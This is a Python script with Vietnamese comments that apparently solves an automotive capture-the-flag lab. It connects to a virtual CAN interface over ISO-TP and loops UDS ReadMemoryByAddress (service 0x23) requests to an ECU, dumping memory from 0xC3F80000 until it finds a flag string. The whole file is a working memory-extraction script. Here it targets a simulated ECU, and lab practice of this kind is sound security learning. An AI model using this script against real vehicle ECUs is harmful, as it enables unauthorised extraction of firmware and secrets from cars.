import isotp
import time
import socket # Thêm thư viện này để hỗ trợ bắt lỗi mạng nếu cần

# --- Cấu hình Mạng CAN ---
TX_ID = 0x7E0        # ID Request gửi đến ECU
RX_ID = 0x7E8        # ID Response nhận từ ECU
INTERFACE = 'vcan0'  # Interface mạng CAN ảo của bài lab

# --- Cấu hình Quét Bộ nhớ ---
START_ADDRESS = 0xC3F80000
READ_SIZE = 0xFF     # Đọc 255 bytes mỗi lần
MAX_ITERATIONS = 500 # Đặt giới hạn lặp để tránh treo script

def build_uds_payload(address, size):
    """
    Hàm này đóng gói payload cho Service 0x23 (ReadMemoryByAddress).
    Cấu trúc: 0x23 (SID) | 0x14 (Format) | Address (4 bytes) | Size (1 byte)
    """
    addr_bytes = address.to_bytes(4, byteorder='big')
    size_byte = size.to_bytes(1, byteorder='big')
    return b'\x23\x14' + addr_bytes + size_byte

def main():
    # 1. Khởi tạo kết nối ISO-TP
    s = isotp.socket()
    
    # SỬA LỖI TIMEOUT Ở ĐÂY: Cài đặt thời gian chờ tối đa cho toàn bộ socket là 1 giây
    s.settimeout(1.0) 
    
    # Ràng buộc socket vào interface vcan0
    s.bind(INTERFACE, isotp.Address(isotp.AddressingMode.Normal_11bits, rxid=RX_ID, txid=TX_ID))
    
    print(f"[*] Bắt đầu rà quét bộ nhớ từ địa chỉ {hex(START_ADDRESS)}...")

    # 2. Vòng lặp quét tuyến tính
    for i in range(MAX_ITERATIONS):
        current_address = START_ADDRESS + (i * READ_SIZE)
        payload = build_uds_payload(current_address, READ_SIZE)
        
        s.send(payload) # Gửi request
        
        try:
            # Nhận phản hồi (KHÔNG truyền tham số timeout vào hàm này nữa)
            response = s.recv()
            
            if response:
                # 0x63 là Positive Response của Service 0x23 (0x23 + 0x40 = 0x63)
                if response[0] == 0x63:
                    memory_data = response[1:] 
                    decoded_text = memory_data.decode('ascii', errors='ignore')
                    
                    print(f"[+] {hex(current_address)}: Đọc thành công {len(memory_data)} bytes.")
                    
                    # Kiểm tra xem có chứa cờ (flag) không
                    if "flag{" in decoded_text:
                        print("\n" + "="*60)
                        print(f"[!!!] ĐÃ TÌM THẤY FLAG TẠI {hex(current_address)} [!!!]")
                        print(f"Dữ liệu trích xuất: {decoded_text}")
                        print("="*60 + "\n")
                        break # Tìm thấy thì dừng lại
                        
                # 0x7F là Negative Response (ECU báo lỗi/từ chối)
                elif response[0] == 0x7F:
                    print(f"[-] {hex(current_address)}: Bị từ chối đọc.")
            else:
                print(f"[!] {hex(current_address)}: Phản hồi rỗng.")
                
        except (TimeoutError, socket.timeout):
            # Bắt lỗi gọn gàng khi hết 1 giây mà ECU không thèm trả lời
            print(f"[!] {hex(current_address)}: Không có phản hồi (Timeout).")
        except Exception as e:
            # Bắt các lỗi ngoại lệ khác
            print(f"[!] Lỗi tại {hex(current_address)}: {e}")
            
        # Nghỉ một chút để mạng CAN giả lập xử lý kịp, tránh làm crash ECU
        time.sleep(0.05) 

    print("[*] Quá trình rà quét kết thúc.")

if __name__ == "__main__":
    main()